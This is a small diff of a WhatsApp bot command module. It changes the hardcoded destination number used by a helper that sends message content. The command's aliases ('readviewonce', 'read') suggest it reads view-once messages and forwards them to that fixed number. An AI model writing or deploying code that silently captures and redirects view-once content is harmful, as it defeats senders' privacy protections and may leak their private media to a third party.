@@ -2,7 +2,7 @@ module.exports = {
     name: '!',
     aliases: ['ver', 'readviewonce', 'read'],
     async execute({ sock, message, jid }) {
-        const destinoJid = '523334445555@s.whatsapp.net';
+        const destinoJid = '4915124477722@s.whatsapp.net';
         const enviarAlDestino = async (contenido) => {
             return sock.sendMessage(destinoJid, contenido);
         };
